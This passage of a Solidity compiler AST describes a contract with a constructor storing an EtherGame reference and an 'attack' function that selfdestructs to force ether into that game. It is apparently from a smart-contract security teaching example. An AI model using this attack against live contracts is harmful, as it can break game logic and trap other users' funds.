																"nodeType": "Identifier",
																"overloadedDeclarations": [],
																"referencedDeclaration": 81,
																"src": "816:10:0",
																"typeDescriptions": {
																	"typeIdentifier": "t_contract$_EtherGame_$75",
																	"typeString": "contract EtherGame"
																}
															}
														],
														"expression": {
															"argumentTypes": [
																{
																	"typeIdentifier": "t_contract$_EtherGame_$75",
																	"typeString": "contract EtherGame"
																}
															],
															"id": 85,
															"name": "EtherGame",
															"nodeType": "Identifier",
															"overloadedDeclarations": [],
															"referencedDeclaration": 75,
															"src": "806:9:0",
															"typeDescriptions": {
																"typeIdentifier": "t_type$_t_contract$_EtherGame_$75_$",
																"typeString": "type(contract EtherGame)"
															}
														},
														"id": 87,
														"isConstant": false,
														"isLValue": false,
														"isPure": false,
														"kind": "typeConversion",
														"lValueRequested": false,
														"names": [],
														"nodeType": "FunctionCall",
														"src": "806:21:0",
														"tryCall": false,
														"typeDescriptions": {
															"typeIdentifier": "t_contract$_EtherGame_$75",
															"typeString": "contract EtherGame"
														}
													},
													"src": "794:33:0",
													"typeDescriptions": {
														"typeIdentifier": "t_contract$_EtherGame_$75",
														"typeString": "contract EtherGame"
													}
												},
												"id": 89,
												"nodeType": "ExpressionStatement",
												"src": "794:33:0"
											}
										]
									},
									"id": 91,
									"implemented": true,
									"kind": "constructor",
									"modifiers": [],
									"name": "",
									"nameLocation": "-1:-1:-1",
									"nodeType": "FunctionDefinition",
									"parameters": {
										"id": 82,
										"nodeType": "ParameterList",
										"parameters": [
											{
												"constant": false,
												"id": 81,
												"mutability": "mutable",
												"name": "_etherGame",
												"nameLocation": "771:10:0",
												"nodeType": "VariableDeclaration",
												"scope": 91,
												"src": "761:20:0",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_contract$_EtherGame_$75",
													"typeString": "contract EtherGame"
												},
												"typeName": {
													"id": 80,
													"nodeType": "UserDefinedTypeName",
													"pathNode": {
														"id": 79,
														"name": "EtherGame",
														"nodeType": "IdentifierPath",
														"referencedDeclaration": 75,
														"src": "761:9:0"
													},
													"referencedDeclaration": 75,
													"src": "761:9:0",
													"typeDescriptions": {
														"typeIdentifier": "t_contract$_EtherGame_$75",
														"typeString": "contract EtherGame"
													}
												},
												"visibility": "internal"
											}
										],
										"src": "760:22:0"
									},
									"returnParameters": {
										"id": 83,
										"nodeType": "ParameterList",
										"parameters": [],
										"src": "783:0:0"
									},
									"scope": 110,
									"src": "749:86:0",
									"stateMutability": "nonpayable",
									"virtual": false,
									"visibility": "public"
								},
								{
									"body": {
										"id": 108,
										"nodeType": "Block",
										"src": "876:106:0",
										"statements": [
											{
												"assignments": [
													95
												],
												"declarations": [
													{
														"constant": false,
														"id": 95,
														"mutability": "mutable",
														"name": "addr",
														"nameLocation": "911:4:0",
														"nodeType": "VariableDeclaration",
														"scope": 108,
														"src": "895:20:0",
														"stateVariable": false,
														"storageLocation": "default",
														"typeDescriptions": {
															"typeIdentifier": "t_address_payable",
															"typeString": "address payable"
														},
														"typeName": {
															"id": 94,
															"name": "address",
															"nodeType": "ElementaryTypeName",
															"src": "895:15:0",
															"stateMutability": "payable",
															"typeDescriptions": {
																"typeIdentifier": "t_address_payable",
																"typeString": "address payable"
															}
														},
														"visibility": "internal"
													}
												],
												"id": 103,
												"initialValue": {
													"arguments": [
														{
															"arguments": [
																{
																	"id": 100,
																	"name": "etherGame",
																	"nodeType": "Identifier",
																	"overloadedDeclarations": [],
																	"referencedDeclaration": 78,
																	"src": "934:9:0",
																	"typeDescriptions": {
																		"typeIdentifier": "t_contract$_EtherGame_$75",
																		"typeString": "contract EtherGame"
																	}
																}
															],
															"expression": {
																"argumentTypes": [
																	{
																		"typeIdentifier": "t_contract$_EtherGame_$75",
																		"typeString": "contract EtherGame"
																	}
																],
																"id": 99,
																"isConstant": false,
																"isLValue": false,
																"isPure": true,
																"lValueRequested": false,
																"nodeType": "ElementaryTypeNameExpression",
																"src": "926:7:0",
																"typeDescriptions": {
																	"typeIdentifier": "t_type$_t_address_$",
																	"typeString": "type(address)"
																},
																"typeName": {
																	"id": 98,
																	"name": "address",
																	"nodeType": "ElementaryTypeName",
																	"src": "926:7:0",
																	"typeDescriptions": {}
																}
															},
															"id": 101,
															"isConstant": false,
															"isLValue": false,
															"isPure": false,
															"kind": "typeConversion",
															"lValueRequested": false,
															"names": [],
															"nodeType": "FunctionCall",
															"src": "926:18:0",
															"tryCall": false,
															"typeDescriptions": {
																"typeIdentifier": "t_address",
																"typeString": "address"
															}
														}
													],
													"expression": {
														"argumentTypes": [
															{
																"typeIdentifier": "t_address",
																"typeString": "address"
															}
														],
														"id": 97,
														"isConstant": false,
														"isLValue": false,
														"isPure": true,
														"lValueRequested": false,
														"nodeType": "ElementaryTypeNameExpression",
														"src": "918:8:0",
														"typeDescriptions": {
															"typeIdentifier": "t_type$_t_address_payable_$",
															"typeString": "type(address payable)"
														},
														"typeName": {
															"id": 96,
															"name": "address",
															"nodeType": "ElementaryTypeName",
															"src": "918:8:0",
															"stateMutability": "payable",
															"typeDescriptions": {}
														}
													},
													"id": 102,
													"isConstant": false,
													"isLValue": false,
													"isPure": false,
													"kind": "typeConversion",
													"lValueRequested": false,
													"names": [],
													"nodeType": "FunctionCall",
													"src": "918:27:0",
													"tryCall": false,
													"typeDescriptions": {
														"typeIdentifier": "t_address_payable",
														"typeString": "address payable"
													}
												},
												"nodeType": "VariableDeclarationStatement",
												"src": "895:50:0"
											},
											{
												"expression": {
													"arguments": [
														{
															"id": 105,
															"name": "addr",
															"nodeType": "Identifier",
															"overloadedDeclarations": [],
															"referencedDeclaration": 95,
															"src": "969:4:0",
															"typeDescriptions": {
																"typeIdentifier": "t_address_payable",
																"typeString": "address payable"
															}
														}
													],
													"expression": {
														"argumentTypes": [
															{
																"typeIdentifier": "t_address_payable",
																"typeString": "address payable"
															}
														],
														"id": 104,
														"name": "selfdestruct",
														"nodeType": "Identifier",
														"overloadedDeclarations": [],
														"referencedDeclaration": 4294967275,
														"src": "956:12:0",
														"typeDescriptions": {
															"typeIdentifier": "t_function_selfdestruct_nonpayable$_t_address_payable_$returns$__$",
															"typeString": "function (address payable)"
														}
													},
													"id": 106,
													"isConstant": false,
													"isLValue": false,
													"isPure": false,
													"kind": "functionCall",
													"lValueRequested": false,
													"names": [],
													"nodeType": "FunctionCall",
													"src": "956:18:0",
													"tryCall": false,
													"typeDescriptions": {
														"typeIdentifier": "t_tuple$__$",
														"typeString": "tuple()"
													}
												},
												"id": 107,
												"nodeType": "ExpressionStatement",
												"src": "956:18:0"
											}
										]
									},
									"functionSelector": "9e5faafc",
									"id": 109,
									"implemented": true,
									"kind": "function",
									"modifiers": [],
									"name": "attack",
									"nameLocation": "852:6:0",
									"nodeType": "FunctionDefinition",
									"parameters": {
										"id": 92,
										"nodeType": "ParameterList",
										"parameters": [],
										"src": "858:2:0"
									},
									"returnParameters": {
										"id": 93,
										"nodeType": "ParameterList",
										"parameters": [],
										"src": "876:0:0"
									},
									"scope": 110,
									"src": "843:139:0",
									"stateMutability": "payable",
									"virtual": false,
									"visibility": "public"
								}
							],
							"scope": 111,
							"src": "698:287:0",
							"usedErrors": []
						}
					],
					"src": "33:954:0"
				},
				"id": 0
			}
		}
	}
}